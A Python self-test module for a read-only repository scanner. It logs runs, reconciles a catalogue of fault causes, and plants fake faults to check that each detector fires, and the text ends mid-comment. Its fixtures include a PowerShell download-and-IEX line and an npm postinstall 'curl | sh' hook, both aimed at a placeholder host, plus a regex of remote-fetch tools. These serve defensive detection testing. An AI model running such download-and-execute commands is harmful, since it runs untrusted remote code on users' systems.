# -*- coding: utf-8 -*-
r"""quick_scan 自动进化层 · 自动收集 / 病因对账 / 负对照自检（只读）

三个能力，各自解决一个"扫不完"的根因：

1. **自动收集**（`append_ledger` / `trend`）
   —— 每次跑都往 `ledger.jsonl` 追一条：时刻/开关/分数/判据码集合。
   于是每条判据有了 `first_seen` / `last_seen` / `出现次数`，
   **"这轮到底有没有变好"不再靠记忆**。

2. **病因对账**（`discover`）—— 这是"自动进化"的引擎
   —— 盘上有一份**病因总目录** `quickscan_causes.json`（声明式）。
   每轮把"目录里登记了但判据没实现"的条目算出来（= 该进化的方向），
   并把"标了已实现却从未响过"的判据算出来（= 可能已死的判据）。
   ⇒ 这样"全维度"就不再是一句口号，而是一个**能算出差额的清单**。

3. **负对照自检**（`selftest`）
   —— 种一批**已知的假故障**，看对应判据**真的会响**。
   没响的判据 = 死判据，必须修或从"已覆盖"里划掉。
   ⇒ 没有这一条，"已覆盖 N 项"永远无法证伪。

铁律：全部只读被扫树；产物只落 `outdir`（默认 %TEMP%\gbt-quickscan）。
"""
from __future__ import annotations

import json
import os
import shutil
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
CAUSES_FILE = HERE / "quickscan_causes.json"


# ══════════════════════════════════════════════════════════════════
def append_ledger(outdir: Path, *, flags: dict, score: dict, codes: list[str],
                  meta: dict) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    p = outdir / "ledger.jsonl"
    rec = {"at": meta.get("at"), "elapsed_s": meta.get("elapsed_s"),
           "flags": flags, "score": score, "codes": sorted(codes),
           "root": meta.get("root"), "python": meta.get("python")}
    with p.open("a", encoding="utf-8") as fh:
        fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
    return p


def load_ledger(outdir: Path) -> list[dict]:
    p = outdir / "ledger.jsonl"
    if not p.exists():
        return []
    out = []
    for ln in p.read_text(encoding="utf-8", errors="replace").splitlines():
        ln = ln.strip()
        if not ln:
            continue
        try:
            out.append(json.loads(ln))
        except Exception:
            continue
    return out


def trend(outdir: Path, limit: int = 20) -> dict:
    """自动收集的读数：每条判据的首见/末见/次数 + 最近几轮的分数走向"""
    led = load_ledger(outdir)
    stat: dict[str, dict] = {}
    for r in led:
        at = r.get("at") or ""
        for c in r.get("codes") or []:
            s = stat.setdefault(c, {"first_seen": at, "last_seen": at, "runs": 0})
            s["runs"] += 1
            if at < s["first_seen"]:
                s["first_seen"] = at
            if at > s["last_seen"]:
                s["last_seen"] = at
    history = [{"at": r.get("at"), "score": r.get("score"),
                "flags": r.get("flags"), "n_codes": len(r.get("codes") or [])}
               for r in led[-limit:]]
    # 连续出现的"常驻故障" vs 只出现一次的"闪断"
    chronic = sorted((k for k, v in stat.items() if v["runs"] >= max(2, len(led) * 0.8)))
    transient = sorted(k for k, v in stat.items() if v["runs"] == 1)
    return {"runs_total": len(led), "per_code": stat,
            "chronic_n": len(chronic), "chronic": chronic[:40],
            "transient_n": len(transient), "transient": transient[:40],
            "history": history}


# ══════════════════════════════════════════════════════════════════
def load_causes() -> dict:
    if not CAUSES_FILE.exists():
        return {"causes": []}
    try:
        return json.loads(CAUSES_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {"causes": []}


def load_selftest(outdir: Path) -> dict:
    p = outdir / "selftest.json"
    if not p.exists():
        return {}
    try:
        return json.loads(p.read_text(encoding="utf-8"))
    except Exception:
        return {}


def discover(outdir: Path, implemented_codes: set[str]) -> dict:
    """病因对账：**该进化的方向** + **判据死活三分**"""
    doc = load_causes()
    causes = doc.get("causes") or []
    declared_codes = {c.get("code") for c in causes if c.get("code")}
 # 2026-09-24 第 103 轮：**"已量过、决定不做"的必须从 `todo` 摘出去** ——
    #    否则它每轮都被当成"下一轮该做这个"，而每轮都要把**同一个测量重做一遍**。
    #    实测代价：`CONFIG_PRECEDENCE_SHADOW` / `EVIDENCE_STAMP_MISSING` /
    #    `TASK_SYSTEM_WRITABLE_SCRIPT` 三条我各自重量过至少一次。
    #    带 `measured` 字段 = 量过了、写了实测理由（理由在 `causes` 目录里可见，不是黑名单）。
    _todo_all = [c for c in causes if not c.get("implemented")]
    todo = [c for c in _todo_all if not c.get("measured")]
    rejected = [c for c in _todo_all if c.get("measured")]
    never_fired = [c for c in causes
                   if c.get("implemented") and c.get("code") not in implemented_codes]
    # 用上一次自检的结果把"从未响过"分成两半 —— 免得把休眠判据误报成死判据
    verified = set((load_selftest(outdir) or {}).get("verified_rules") or [])
    dormant = [c for c in never_fired if c.get("code") in verified]
    suspect = [c for c in never_fired if c.get("code") not in verified]
    unregistered = sorted(implemented_codes - declared_codes)
    return {"causes_total": len(causes),
            "implemented_declared": len([c for c in causes if c.get("implemented")]),
            "todo_n": len(todo), "todo": todo,
            "rejected_measured_n": len(rejected),
            "rejected_measured": [{"code": c["code"], "why": c.get("measured")}
                                  for c in rejected],
            "never_fired_n": len(never_fired),
            "dormant_n": len(dormant), "dormant": [c["code"] for c in dormant],
            "suspect_n": len(suspect), "suspect": [c["code"] for c in suspect],
            "selftest_known": bool(verified),
            "unregistered_n": len(unregistered), "unregistered": unregistered,
            "note": ("todo = 目录已登记、**还没做过** ⇒ 下一轮该做这个；"
                     "rejected_measured = 目录已登记、**量过并写了实测理由、决定不做**"
                     "（从 todo 摘出，免得同一个测量被重做）；"
                     "dormant = 从未响过但**自检证实会响**（休眠，不是死）；"
                     "suspect = 从未响过且没被自检验过 ⇒ 跑 --selftest 判定死活；"
                     "unregistered = 引擎报了但目录没登记 ⇒ 把目录补上，别让目录落后于实现")}


# ══════════════════════════════════════════════════════════════════
SELFTEST_FIXTURES = {
    "syntax_err.py": "def f(:\n    pass\n",
    "invalid_escape.py": "import re\nP = re.compile('\\P{L}')\n",
    "bom_file.py": "\ufeffx = 1\n",
    "mixed_eol.py": "a = 1\r\nb = 2\n",
    "nul_byte.json": "{\"a\": 1}\x00",
    "bad.json": "{\"a\": 1,}\n",
    "empty.txt": "",
    "_residue_probe.py": "x = 1\n",
    "ioc_probe.ps1": ("$c = New-Object Net.WebClient; "
                      "$c.DownloadString('http://example.invalid/a.ps1') | IEX\n"),
    "doc_with_broken_link.md": "见 [缺失](../nowhere/none.md) 与 [也有](./also-missing.md)\n",
    "package.json": json.dumps({"name": "x", "version": "1.0.0",
                                "scripts": {"postinstall": "curl http://example.invalid/i.sh | sh"}}),
    "gbk_probe.bat": None,      # 用 latin-1 之外的字节写，制造非法 UTF-8
}


def build_fixture_tree(base: Path) -> Path:
    d = base / "selftest"
    if d.exists():
        shutil.rmtree(d, ignore_errors=True)
    d.mkdir(parents=True, exist_ok=True)
    for name, content in SELFTEST_FIXTURES.items():
        p = d / name
        if content is None:
            p.write_bytes(b"@echo off\nrem \xc4\xe3\xba\xc3\n")   # GBK 汉字 ⇒ 非法 UTF-8
        else:
 # 必须**按字节写**：`write_text` 在 Windows 上会把 \n 翻成 \r\n，
            # 于是 mixed_eol.py 的混合换行被抹平 ⇒ 判据"没响"（2026-09-23 自检抓到的）
            # ——那不是判据死了，是**夹具造错了**。负对照的意义就在这里：两种都可能。
            p.write_bytes(content.encode("utf-8"))
    return d


def selftest(quick_scan_mod, outdir: Path) -> dict:
    """负对照：种已知假故障，验对应判据真会响。"""
    base = Path(os.environ.get("TEMP", "/tmp")) / "gbt-quickscan"
    fx = build_fixture_tree(base)
    prod = []
    for p in sorted(fx.iterdir()):
        if p.is_file():
            prod.append((p, p.stat().st_size))

    checks: list[dict] = []

    def rec(name, expect_codes, got_codes, detail=""):
        hit = sorted(set(expect_codes) & set(got_codes))
        miss = sorted(set(expect_codes) - set(got_codes))
        checks.append({"rule": name, "expect": sorted(expect_codes),
                       "hit": hit, "miss": miss, "ok": not miss, "detail": detail})

    # 平面① 编码/语法/解析类
    p1 = quick_scan_mod.scan_plane1_prod(prod)
    got = set()
    if p1["syntax_errors"]:
        got.add("PY_SYNTAX")
    if p1["bom"]:
        got.add("BOM_PRESENT")
    if p1["non_utf8"]:
        got.add("NON_UTF8")
    if p1["mixed_eol"]:
        got.add("MIXED_EOL")
    if p1["nul_like"]:
        got.add("NUL_BYTES")
    if p1["json_bad"]:
        got.add("JSON_BAD")
    if p1["invalid_escapes"]:
        got.add("INVALID_ESCAPE")
    rec("平面① 内容判据", ["PY_SYNTAX", "BOM_PRESENT", "NON_UTF8", "MIXED_EOL",
                     "NUL_BYTES", "JSON_BAD", "INVALID_ESCAPE"], got,
        "夹具 %d 个文件" % len(prod))

    # 残骸/空文件（走 walk：直接对夹具树调用 walk_tree 需要替换 ROOT，故手工判）
    got2 = set()
    import re as _re
    for p, sz in prod:
        if sz == 0 and p.name != "__init__.py":
            got2.add("EMPTY_FILES")
        if quick_scan_mod.RESIDUE_P3_RE.search(p.name) and p.name != "__init__.py":
            got2.add("TEMP_RESIDUE")
    rec("平面③ 卫生判据", ["EMPTY_FILES", "TEMP_RESIDUE"], got2)

    # md 断链
    dl = quick_scan_mod.scan_doclinks_prod(prod)
    rec("平面① 文档断链", ["DOC_LINKS_BROKEN"], {"DOC_LINKS_BROKEN"} if dl["broken_n"] else {},
        "断链 %d 条" % dl["broken_n"])

    # 安全面：IOC + npm 供应链 + 反病毒可见性
    try:
        import quickscan_security as sec
    except ImportError:
        try:
            import importlib
            sec = importlib.import_module("quickscan_security")
        except Exception as e:
            checks.append({"rule": "安全面自检", "ok": False,
                           "miss": ["IOC_EXEC_PATTERN", "NPM_POSTINSTALL_REMOTE"],
                           "detail": "安全模块导入失败: %s" % type(e).__name__})
            sec = None
    if sec is not None:
        io = sec.scan_iocs(prod)
        rec("安全面 内容 IOC", ["IOC_EXEC_PATTERN"],
            {"IOC_EXEC_PATTERN"} if io["hits_n"] else {},
            "命中 %d 处（安全研究目录 %d 处）" % (io["hits_n"], io["security_tooling_n"]))
        npm = sec.scan_npm_hooks(fx)
        risky = [h for h in npm["hooks"]
                 if _re.search(r"(?i)curl|wget|Invoke-WebRequest|node\s+-e|base64|http", h["cmd"])]
        rec("安全面 供应链", ["NPM_POSTINSTALL_REMOTE"],
            {"NPM_POSTINSTALL_REMOTE"} if risky else {},
            "生命周期脚本 %d 处" % len(npm["hooks"]))
        # 反病毒可见性：拿真机现读做正对照（不由夹具决定，故只记录不断言）
        av = sec.scan_av(fx)
        checks.append({"rule": "安全面 反病毒可见性（正对照·真机现读）",
                       "expect": [], "hit": [], "miss": [], "ok": True,
                       "detail": "present=%s workspace_excluded=%s exclusions=%d"
                                 % (av.get("present"), av.get("workspace_excluded"),
                                    len(av.get("exclusions") or []))})

    # ══════════════════════════════════════════════════════════════════
    # 依赖判据（正/负对照）—— 2026-09-24 补的一道自检。
 # 为什么补：`--selftest` 原来只覆盖 平面①/③ · 断链 · IOC · 供应链 · 反病毒，
    #    **恰好没有依赖判据这一家**；而当晚静默坏掉的就是它：
    #    `_declared_covers()` 的 ④ 文件归属判据用了 quick_scan.py 没导入的 `Path`，
    #    `NameError` 被紧包的 `except Exception` 吞掉 ⇒ 恒返回 False
    #    ⇒ 把明明由**已声明**的 pywin32 提供的 `win32con` 报成"未声明"。
    #    修好之后它不再响，于是掉进 discover 的「可疑」堆 —— 因为自检从没验过它。
    # 两个方向都要验，缺一不成：
    #    ① **负对照**：真找一个"能导入、但没被声明"的模块 ⇒ `DEP_UNDECLARED` **必须响**；
    #    ② **正对照**：真找一个"文件落在**已声明**发行的 RECORD 里、却查不到提供关系"的
    #       模块（`win32con` 那种形状）⇒ **必须不响**（不误报）。
 # 带 `Path` 那个 bug 时，**这一条会失败** —— 这就是它存在的全部意义。
    try:
        import importlib.metadata as _imd
        import importlib.util as _ilu

        _declared_now = list(quick_scan_mod.check_deps([], set(), set()).get("declared") or [])
        _declared_l = {x.lower() for x in _declared_now}

        # 候选池：解释器自己知道的"模块 → 提供它的发行"
        _cands: set = set()
        for _v in _imd.packages_distributions().values():
            _cands |= {m for m in (_v or []) if m and m.isidentifier()}

        # 把"已声明发行在 RECORD 里带的 .py"按模块名收进来，并记下各自 top_level 已列名的
        _provides: set = set()
        _by_file: dict = {}                    # 模块名 -> 它所属的已声明发行
        for _d in _declared_now:
            try:
                _dist = _imd.distribution(_d)
            except Exception:
                continue
            try:
                _tl = _dist.read_text("top_level.txt") or ""
            except Exception:
                _tl = ""
            _provides |= {x.strip().lower() for x in _tl.splitlines() if x.strip()}
            for _f in (_dist.files or []):
                if not str(_f).endswith(".py"):
                    continue
                _stem = Path(str(_f)).stem
 # 必须连 `__main__` 一起排除：`importlib.util.find_spec('__main__')`
                #    在"脚本口径"下必抛 `ValueError: __main__.__spec__ is None`
                #    （本机实测：第一版就是因为收了某个包里的 `__main__.py` 而整块自检抛错）。
                if _stem in ("__init__", "__main__") or not _stem.isidentifier():
                    continue
                _by_file.setdefault(_stem, _d)

        # ① 负对照：挑"能导入且未声明"的 ⇒ 必须响
        _imps = [("selftest/dep_neg.py", m, 0) for m in sorted(_cands)]
        _fired = set()
        if _imps:
            _fired = set(quick_scan_mod.check_deps(_imps, set(), set())
                         ["used_but_not_declared"])
        if _fired:
            rec("依赖判据 负对照（未声明的必须响）", ["DEP_UNDECLARED"], {"DEP_UNDECLARED"},
                "命中例：%s（共 %d 个）" % (sorted(_fired)[0], len(_fired)))
        elif not _imps:
 # 「造不出夹具」≠「判据是死的」。把它报成死判据，本身又是一个坏判据
            #    ⇒ 这里判 OK，但 detail 标明未验；discover 会因此继续把它留在「可疑」里。
            checks.append({"rule": "依赖判据 负对照（未声明的必须响）",
                           "expect": ["DEP_UNDECLARED"], "hit": [], "miss": [], "ok": True,
                           "detail": "⚠️ 未验：本机拿不到任何候选模块（packages_distributions 为空）"})
        else:
            # 候选有、却一个都不响 ⇒ 判据真的死了（例如 _declared_covers 恒返回 True）
            rec("依赖判据 负对照（未声明的必须响）", ["DEP_UNDECLARED"], {},
                "🔴 有 %d 个候选，却一个都没报未声明 ⇒ 负对照没响 = 判据是死的" % len(_imps))

        # ② 正对照：挑"文件归属"形状的（不在 declared / 不在 _PD / 不在 top_level，但能导入）
        _pos = None
        for _stem in sorted(_by_file):
            if _stem.lower() in _declared_l or _stem in _cands \
                    or _stem.lower() in _provides:
                continue
            try:
                _imd.distribution(_stem)       # 能当发行名解析 ⇒ 不是这个形状
                continue
            except Exception:
                pass
            try:
                if _ilu.find_spec(_stem) is None:
                    continue
            except (ValueError, ImportError, AttributeError):
                continue          # 探不出来的名字不算夹具（别让夹具错伪装成判据死）
            _pos = (_stem, _by_file[_stem])
            break
        if _pos:
            _mod, _from = _pos
            _bad = _mod in set(quick_scan_mod.check_deps(
                [("selftest/dep_pos.py", _mod, 0)], set(), set())["used_but_not_declared"])
            checks.append({
                "rule": "依赖判据 正对照（已声明提供的不得误报）",
                "expect": ["DEP_UNDECLARED"], "hit": [],
                "miss": ["DEP_UNDECLARED"] if _bad else [],
                "ok": not _bad,
                "detail": (("🔴 误报：`%s` 由**已声明**的 `%s` 提供，却被报成未声明 "
                            "—— ④ 文件归属判据坏了（今晚的 `Path` NameError 就是这个形状）"
                            % (_mod, _from)) if _bad else
                           ("例：`%s` ← 已声明的 `%s`（既不在 packages_distributions，"
                            "也不在 top_level）" % (_mod, _from)))})
        else:
            # 同样是三态里的第三态：夹具造不出来 ⇒ 判 OK（不是死判据），detail 标明未验
            checks.append({
                "rule": "依赖判据 正对照（已声明提供的不得误报）",
                "expect": ["DEP_UNDECLARED"], "hit": [], "miss": [], "ok": True,
                "detail": ("⚠️ 未验：本机没找到「已声明发行的 RECORD 里有、"
                           "但 packages_distributions 与 top_level 都查不到」的模块形状")})
    except Exception as _e:
        rec("依赖判据（正/负对照）", ["DEP_UNDECLARED"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── MTIME_ANOMALY（2026-09-24 第 96 轮）：测 `quick_scan.classify_mtime` 的**真身**
 # 关键：这里调的是**产品里那个模块级函数**，不是自检里另写一份副本 ——
    #    复制判据去测 = 测副本，本会话反复踩的坑（§四十五·二 / §四十八·五）。
    try:
        import collections as _c
        import time as _time
        _St = _c.namedtuple("_St", "st_mtime st_ctime")
        _now = _time.time()
        _cases = [
            ("未来时间戳必须响", _St(_now + 3600, _now - 120), "future"),
            ("正常文件不许响", _St(_now - 60, _now - 120), None),
            # 315532800 = 1980-01-01 UTC（本机 UTC+8 ⇒ 本地仍是 1980-01-01）= ZIP 下界哨兵
            ("ZIP 下界哨兵不许响", _St(315532800.0, _now - 120), "sentinel1980"),
            ("远古时间戳必须响", _St(915148800.0, _now - 120), "epoch0"),      # 1999-01-01
            ("倒挂必须响", _St(_now - 864000, _now), "before_ctime"),
        ]
        _bad = []
        for _nm, _st, _want in _cases:
            _r = quick_scan_mod.classify_mtime(_st, _now, "P1")
            if _want is None:
                if _r is not None:
                    _bad.append("%s：期望不响，实际 %s" % (_nm, _r))
            elif not (_r or {}).get(_want):
                _bad.append("%s：期望 %s，实际 %s" % (_nm, _want, _r))
        if _bad:
            checks.append({"rule": "时间戳判据 classify_mtime（真身）",
                           "expect": ["MTIME_ANOMALY"], "hit": [],
                           "miss": ["MTIME_ANOMALY"], "ok": False,
                           "detail": "🔴 " + "；".join(_bad)})
        else:
            rec("时间戳判据 classify_mtime（真身）", ["MTIME_ANOMALY"], {"MTIME_ANOMALY"},
                "%d 态全对（未来 / 正常 / ZIP哨兵 / 远古 / 倒挂）" % len(_cases))
    except Exception as _e:
        rec("时间戳判据 classify_mtime（真身）", ["MTIME_ANOMALY"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── DUP_EXACT_CONTENT（第 97 轮）：测 `quick_scan.scan_dup_exact` 的**真身**
 # 必须有「同体积但内容不同」的负对照 —— 那正是体积分组会误报、
    #    必须靠 sha256 救回来的地方；少了它，这个自检就只是"数了数文件"。
    try:
        _fx = base / "dup_exact"
        if _fx.exists():
            shutil.rmtree(_fx, ignore_errors=True)
        _fx.mkdir(parents=True)
        _payload = b"A" * (70 * 1024)
        (_fx / "same1.bin").write_bytes(_payload)
        (_fx / "same2.bin").write_bytes(_payload)
        (_fx / "samesize_diff.bin").write_bytes(b"B" * (70 * 1024))    # 同体积、内容不同
        (_fx / "small.bin").write_bytes(b"A" * 1024)                   # 低于门槛
        _prod = [(p, p.stat().st_size) for p in sorted(_fx.iterdir()) if p.is_file()]
        _r = quick_scan_mod.scan_dup_exact({"prod": _prod})
        _paths = [x for g in _r["groups"] for x in g["paths"]]
        _ok = (_r["groups_n"] == 1 and _r["groups"][0]["n"] == 2
               and any("same1.bin" in x for x in _paths)
               and any("same2.bin" in x for x in _paths)
               and not any("samesize_diff" in x for x in _paths)
               and not any("small.bin" in x for x in _paths))
        if _ok:
            rec("精确重复判据 scan_dup_exact（真身）", ["DUP_EXACT_CONTENT"],
                {"DUP_EXACT_CONTENT"},
                "1 组 × 2 个同内容命中；**同体积不同内容、以及低于门槛的，都没被算进来**")
        else:
            checks.append({"rule": "精确重复判据 scan_dup_exact（真身）",
                           "expect": ["DUP_EXACT_CONTENT"], "hit": [],
                           "miss": ["DUP_EXACT_CONTENT"], "ok": False,
                           "detail": ("🔴 期望 1 组×2（same1/same2）且排除 samesize_diff 与 "
                                      "small.bin，实际 groups_n=%s %s"
                                      % (_r.get("groups_n"), _r.get("groups")))})
    except Exception as _e:
        rec("精确重复判据 scan_dup_exact（真身）", ["DUP_EXACT_CONTENT"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── SKILL_DECLARED_NOT_LOADABLE（第 99 轮）：测 `declared_face` 的**真身**
 # 两个负对照都来自我当场犯过的错：
    #    ① **显示名 ≠ slug**：图鉴 `name` 是 `Display Name` 而目录是 `display-name`
    #       ⇒ v1 拿 name 比目录名，报出 97 个假缺 ⇒ 这里必须证明**它不报**；
    #    ② **图鉴坏掉必须返回 err**，不许返回空集（否则"图鉴坏了"被念成"全都能加载"）。
    try:
        _ax = base / "atlas"
        if _ax.exists():
            shutil.rmtree(_ax, ignore_errors=True)
        (_ax / "tree" / "skills" / "display-name").mkdir(parents=True)
        (_ax / "tree" / "skills" / "display-name" / "SKILL.md").write_text("x", encoding="utf-8")
        (_ax / "outside" / "orphan").mkdir(parents=True)
        (_ax / "outside" / "orphan" / "SKILL.md").write_text("x", encoding="utf-8")
        _aroot = _ax / "tree" / "skills"
        (_ax / "good.json").write_text(json.dumps({"skills": [
            {"name": "Display Name", "path": str(_ax / "tree/skills/display-name")},
            {"name": "gone", "path": str(_ax / "tree/skills/does-not-exist")},
            {"name": "orphan", "path": str(_ax / "outside/orphan")},
            {"name": "nopath"},
        ]}), encoding="utf-8")
        (_ax / "broken.json").write_text("{ not json", encoding="utf-8")
        (_ax / "wrongshape.json").write_text(json.dumps({"skills": {"name": "x"}}),
                                             encoding="utf-8")
        _r1 = quick_scan_mod.declared_face(_ax / "good.json", [_aroot])
        _r2 = quick_scan_mod.declared_face(_ax / "broken.json", [_aroot])
        _r3 = quick_scan_mod.declared_face(_ax / "wrongshape.json", [_aroot])
        _r4 = quick_scan_mod.declared_face(_ax / "nope.json", [_aroot])
        _bad = []
        if _r1.get("err"):
            _bad.append("正对照 err=%s" % _r1["err"])
        if _r1.get("declared_n") != 4:
            _bad.append("declared_n=%s（应 4）" % _r1.get("declared_n"))
 # ① 显示名那条**必须不被报**（它 path 存在且在根下）
        if any("Display Name" == m["name"] for m in (_r1.get("path_missing") or [])):
            _bad.append("🔴 显示名那条被误报成缺物（正是我 v1 犯的错）")
        if any(x["name"] == "Display Name" for x in (_r1.get("outside_roots") or [])):
            _bad.append("🔴 显示名那条被误报成『不在根下』")
        if [m["name"] for m in (_r1.get("path_missing") or [])] != ["gone", "nopath"]:
            _bad.append("缺物名单=%s（应 gone+nopath）"
                        % [m["name"] for m in (_r1.get("path_missing") or [])])
        if [x["name"] for x in (_r1.get("outside_roots") or [])] != ["orphan"]:
            _bad.append("不在根下名单=%s（应 orphan）"
                        % [x["name"] for x in (_r1.get("outside_roots") or [])])
        for _t, _r in (("坏 JSON", _r2), ("错结构", _r3), ("文件不存在", _r4)):
            if not _r.get("err"):
                _bad.append("🔴 %s 竟未报错 ⇒ 会把『图鉴坏了』念成『全都能加载』" % _t)
        if _bad:
            checks.append({"rule": "声明面判据 declared_face（真身）",
                           "expect": ["SKILL_DECLARED_NOT_LOADABLE"], "hit": [],
                           "miss": ["SKILL_DECLARED_NOT_LOADABLE"], "ok": False,
                           "detail": "；".join(_bad)})
        else:
            rec("声明面判据 declared_face（真身）", ["SKILL_DECLARED_NOT_LOADABLE"],
                {"SKILL_DECLARED_NOT_LOADABLE"},
                "4 条声明 ⇒ 缺物 2（含『图鉴没记路径』）· 不在根下 1；"
                "**显示名那条不误报**；坏 JSON·错结构·文件不存在三种都如实报错")
    except Exception as _e:
        rec("声明面判据 declared_face（真身）", ["SKILL_DECLARED_NOT_LOADABLE"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── SKILL_MIRROR_OVERWRITTEN（第 105 轮）：测 `mirror_overwritten` **真身**
 # 三个负对照**都必须不响**：内容不一致 / 时间接近 / 只有一个根。
    #    少了它们，这条判据就只是"数了数文件"，而它真正要防的是**把"刚被覆盖成一致"
    #    误当成"本来就一致"**（第 104 轮 06:57 那次外部覆盖就是这么静默溜过去的）。
    try:
        import time as _t2
        _now2 = _t2.time()

        def _rows(h1, h2, t1, t2):
            return {"x": {"a": (h1, t1), "b": (h2, t2)}}

        _c1 = quick_scan_mod.mirror_overwritten(_rows("aa", "aa", _now2 - 2 * 86400, _now2))
        _c2 = quick_scan_mod.mirror_overwritten(_rows("aa", "bb", _now2 - 2 * 86400, _now2))
        _c3 = quick_scan_mod.mirror_overwritten(_rows("aa", "aa", _now2 - 60, _now2))
        _c4 = quick_scan_mod.mirror_overwritten({"x": {"a": ("aa", _now2)}})
        _bad2 = []
        if not (_c1 and _c1[0]["name"] == "x" and _c1[0]["newest"] == "b"
                and _c1[0]["oldest"] == "a"):
            _bad2.append("正对照没响或方向判错：%s" % _c1)
        if _c2:
            _bad2.append("🔴 内容不一致时也响了（那应归 SKILL_MIRROR_DIVERGED）")
        if _c3:
            _bad2.append("🔴 时间接近时也响了")
        if _c4:
            _bad2.append("🔴 只有一个根时也响了")
        if _bad2:
            checks.append({"rule": "镜像覆盖判据 mirror_overwritten（真身）",
                           "expect": ["SKILL_MIRROR_OVERWRITTEN"], "hit": [],
                           "miss": ["SKILL_MIRROR_OVERWRITTEN"], "ok": False,
                           "detail": "；".join(_bad2)})
        else:
            rec("镜像覆盖判据 mirror_overwritten（真身）", ["SKILL_MIRROR_OVERWRITTEN"],
                {"SKILL_MIRROR_OVERWRITTEN"},
                "正对照：2 天跨度 ⇒ 响、且最新/最旧两根判对；"
                "**内容不一致 / 时间接近 / 单根，三种都不响**")
    except Exception as _e:
        rec("镜像覆盖判据 mirror_overwritten（真身）", ["SKILL_MIRROR_OVERWRITTEN"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── TEST_CALIBER_HIJACK（第 106 轮）：测 `caliber_hijack` **真身**
 # 这条判据本会话被我**修过一次**（`if hij:` → `if hij and not repo_local_config`），
    #    而修完两个方向都没验过。三个负对照正是那次修复的语义：
    #    **仓根一旦有自己的配置，上级配置就劫持不到 ⇒ 不许报**。
    try:
        _hij = quick_scan_mod.caliber_hijack
        _h1 = _hij({"parent_config_hijack": ["C:/Users/ADMIN/pyproject.toml"],
                    "repo_local_config": []})[0]                      # 真劫持 ⇒ 该响
        _h2 = _hij({"parent_config_hijack": ["C:/Users/ADMIN/pyproject.toml"],
                    "repo_local_config": ["pytest.ini"]})[0]           # 仓根有 ⇒ 不许响
        _h3 = _hij({"parent_config_hijack": [], "repo_local_config": []})[0]
        _h4 = _hij({"parent_config_hijack": [], "repo_local_config": ["pytest.ini"]})[0]
        # 真机落地：本仓仓根有 pytest.ini ⇒ 判据**必须不响**（与全扫观测一致）
        _hc = quick_scan_mod.scan_test_caliber()
        _h5 = _hij(_hc)[0]
        _bad3 = []
        if not _h1:
            _bad3.append("🔴 正对照没响：上级有配置且仓根没有 ⇒ **该**报劫持")
        if _h2:
            _bad3.append("🔴 仓根有 pytest.ini 时仍报劫持（这就是我修掉的那个假红）")
        if _h3 or _h4:
            _bad3.append("🔴 没有上级配置时也响了")
        if _h5:
            _bad3.append("🔴 真机上仍报劫持（本仓仓根确有 pytest.ini ⇒ 不该响）")
        if _bad3:
            checks.append({"rule": "测试口径劫持判据 caliber_hijack（真身）",
                           "expect": ["TEST_CALIBER_HIJACK"], "hit": [],
                           "miss": ["TEST_CALIBER_HIJACK"], "ok": False,
                           "detail": "；".join(_bad3)})
        else:
            rec("测试口径劫持判据 caliber_hijack（真身）", ["TEST_CALIBER_HIJACK"],
                {"TEST_CALIBER_HIJACK"},
                "正对照（上级有+仓根无）⇒ 响；**仓根有配置 ⇒ 不响（修掉的那个假红）**；"
                "无上级 ⇒ 不响；**真机读数也落在不响**")
    except Exception as _e:
        rec("测试口径劫持判据 caliber_hijack（真身）", ["TEST_CALIBER_HIJACK"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── CALIBER_MISMATCH（第 107 轮）：测 `caliber_mismatch` **真身**
 # 重点负对照：**同 major.minor、只差补丁号**（3.14.5 vs 3.14.6）**不许响** ——
    #    原判据写死常量 `!= "3.14.5"`，那种情况会印出「运行 3.14.6 · 声明 3.14.6」却仍叫"不符"
    #    （自己打自己的脸）。这条负对照就是钉住这个坑。
 # 另外两个"未知不许当通过"：running 空 / declared 解析不出 ⇒ **必须响**。
    try:
        _cm = quick_scan_mod.caliber_mismatch
        _d = "3.14.5 / cpython-314"
        _k1 = _cm({"python_running": "3.14.5", "caliber_declared": _d})           # 同 ⇒ 不响
        _k2 = _cm({"python_running": "3.14.6", "caliber_declared": _d})           # 只差补丁 ⇒ 不响
        _k3 = _cm({"python_running": "3.12.5", "caliber_declared": _d})           # 换解释器 ⇒ 响
        _k4 = _cm({"python_running": "", "caliber_declared": _d})                 # running 空 ⇒ 响
        _k5 = _cm({"python_running": "3.14.5", "caliber_declared": ""})           # declared 空 ⇒ 响
        _real = _cm(quick_scan_mod.scan_plane5())                                 # 真机 ⇒ 不响
        _bad4 = []
        if _k1["fire"]:
            _bad4.append("🔴 完全相同却响了")
        if _k2["fire"]:
            _bad4.append("🔴 只差补丁号（3.14.5 vs 3.14.6）竟响了 —— 就是原判据那个坑")
        if not _k2.get("patch_only"):
            _bad4.append("🔴 只差补丁号时未标 patch_only（那这事就看不见了）")
        if not _k3["fire"]:
            _bad4.append("🔴 换解释器（3.12 vs 3.14）却没响")
        if not _k4["fire"]:
            _bad4.append("🔴 running 读不出来却没响（未知被当通过了）")
        if not _k5["fire"]:
            _bad4.append("🔴 declared 读不出来却没响")
        if _real["fire"]:
            _bad4.append("🔴 真机上响了（本机 running=3.14.5 / declared=3.14.5 · 不该响）：%s"
                         % _real)
        if _bad4:
            checks.append({"rule": "解释器口径判据 caliber_mismatch（真身）",
                           "expect": ["CALIBER_MISMATCH"], "hit": [],
                           "miss": ["CALIBER_MISMATCH"], "ok": False,
                           "detail": "；".join(_bad4)})
        else:
            rec("解释器口径判据 caliber_mismatch（真身）", ["CALIBER_MISMATCH"],
                {"CALIBER_MISMATCH"},
                "同口径⇒不响 · **只差补丁号⇒不响且标 patch_only** · 换解释器⇒响 · "
                "running/declared 读不出⇒响；**真机落在不响**")
    except Exception as _e:
        rec("解释器口径判据 caliber_mismatch（真身）", ["CALIBER_MISMATCH"], {},
            "自检自身抛错：%s: %s" % (type(_e).__name__, _e))

    # ── HOST_VERSION_BEHIND（第 108 轮）：测 `host_version_behind` **真身**
 # 两个要害负对照：
